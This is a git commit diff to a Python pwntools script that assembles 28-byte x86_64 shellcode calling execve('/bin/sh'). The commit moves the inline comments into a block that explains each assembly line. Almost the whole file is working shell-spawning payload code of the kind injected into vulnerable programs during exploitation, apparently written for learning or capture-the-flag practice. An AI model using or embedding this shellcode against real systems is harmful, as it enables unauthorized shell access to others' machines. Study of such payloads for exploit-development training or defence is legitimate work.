34e842fa15334555f01b870760a17d5e08a539c9
Pugal Selvan V <86313268+Pugal09@users.noreply.github.com>
2022-08-29 10:00:32 +0530

    Update exeve-bin-sh-x86_64.py

--- exeve-bin-sh-x86_64.py
+++ exeve-bin-sh-x86_64.py
@@ -8,15 +8,19 @@ push rax
 push rax
 pop rsi
 pop rdx
-mov rcx, 0x68732f6e69622f41             # moving "A/bin/sh" into rcx
-shr rcx, 0x8                            # shifting rcx towards right to make "A/bin/sh" to "/bin/sh\x00"
+mov rcx, 0x68732f6e69622f41             
+shr rcx, 0x8                            
 push rcx
 push rsp
 pop rdi
-mov al, 0x3b                            # syscall number for execve()
+mov al, 0x3b                            
 syscall
 """
-
+# line 6 to 10: To make rax,rsi and rdx null.
+# line 11: moving "A/bin/sh" into rcx.
+# line 12: shifting rcx towards right to make "A/bin/sh" to "/bin/sh\x00".
+# line 13 to 15: Moving the pointer which points to "/bin/sh\x00" into rdi.
+# line 16 : Moving the syscall number of execve() into rax. 
 shellcode = asm(shellcode)
 log.info(f"bytes of the shellcode: {shellcode}")            
 log.info(f"lenght of the shellcode: {len(shellcode)}")        # 28 bytes shellcode
